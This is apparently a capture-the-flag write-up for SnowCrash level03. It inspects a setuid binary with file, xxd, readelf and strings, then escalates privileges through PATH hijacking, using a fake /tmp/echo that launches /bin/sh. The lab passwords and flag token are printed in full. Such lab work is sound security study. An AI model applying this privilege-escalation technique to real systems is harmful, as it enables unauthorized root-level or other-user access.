# Level03

### PATH hijacking
---

```
 ssh level03@192.168.1.50 -p 4242
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.50 
level03@192.168.1.50's
password: kooda2puivaav1idi4f57q8iq
level03@SnowCrash:~$ 

```

First reconnaissance ```ls -al```

```
level03@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
level03@SnowCrash:~$ 
```

### - 1 - First step  ``` ~$ file filename ```

use tools that inspect the file headers and identify the file format.

```level03@SnowCrash:~$  file filename```


```
level03@SnowCrash:~$ file level03 
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
level03@SnowCrash:~$ 
```

```
This tells hus:

It is an ELF file
It is 32-bit
The architecture is x86
It is dynamically linked
It has the setuid permission
```

### - 2 - View the raw file header (first bytes) ``` ~$ xxh filename | head ```

level03@SnowCrash:~$ level03@SnowCrash:~$ xxd level03 | head

```
level03@SnowCrash:~$ xxd level03 | head
0000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
0000010: 0200 0300 0100 0000 f083 0408 3400 0000  ............4...
0000020: 1415 0000 0000 0000 3400 2000 0900 2800  ........4. ...(.
0000030: 2400 2100 0600 0000 3400 0000 3480 0408  $.!.....4...4...
0000040: 3480 0408 2001 0000 2001 0000 0500 0000  4... ... .......
0000050: 0400 0000 0300 0000 5401 0000 5481 0408  ........T...T...
0000060: 5481 0408 1300 0000 1300 0000 0400 0000  T...............
0000070: 0100 0000 0100 0000 0000 0000 0080 0408  ................
0000080: 0080 0408 f806 0000 f806 0000 0500 0000  ................
0000090: 0010 0000 0100 0000 140f 0000 149f 0408  ................
level03@SnowCrash:~$ 
```

Examples:


| First bytes | File type |
|-------------|-----------|
| 7f 45 4c 46 | ELF executable |
| 50 4b 03 04 | ZIP archive |
| 25 50 44 46 | PDF |
| ff d8 ff | JPEG image |
| 89 50 4e 47 | PNG image |
| 1f 8b | GZIP |


### 3 - For ELF files: read the ELF header ``` ~$ readelf -h filename ```

readelf -h level03

```
level03@SnowCrash:~$ readelf -h level03 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x80483f0
  Start of program headers:          52 (bytes into file)
  Start of section headers:          5396 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         36
  Section header string table index: 33
level03@SnowCrash:~$ 
```

### - 4 - Extract readable text from binaries ``` ~$ strings filename ```
 
Very useful

```
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
...
...
```

This can reveal:

commands executed by the program

library functions used

hidden messages


5 - Check permissions ``` ~$ ls -l filename ```

-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03

The s means SUID/SGID. 

When executed, it runs with the ***owner's*** privileges instead of the user's privileges.


### 6 - View all ELF information ``` readelf -a filename | less ```


## Important content

whith commant string level3

-> /home/user/level03/level03.c

by execute ./level3.c i received the message " Exploit me "

---
---

# level03

The binary `level03` has the SUID bit enabled:

```-rwsr-sr-x 1 flag03 level03 level03```


This means that when executed, it runs with the privileges of the `flag03` user.

Using `strings` on the binary revealed:

```/usr/bin/env echo Exploit me```


The program uses `system()` to execute `echo`.

The vulnerability is related to the use of `env`, because it searches commands using the `PATH` environment variable.

I created a fake `echo` executable:

```bash
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
```

Then I changed the PATH so /tmp is searched first:

```export PATH=/tmp:$PATH```

When running:

```./level03```

the program executes my fake echo instead of /bin/echo, giving me a shell with flag03 privileges.

Finally:

```getflag```

returns the token:

``` qi0maab88jeaj46qoumi7maus ```

---

### Next Password for ssh level04@192.168.1.50 -p 4242

### qi0maab88jeaj46qoumi7maus

---



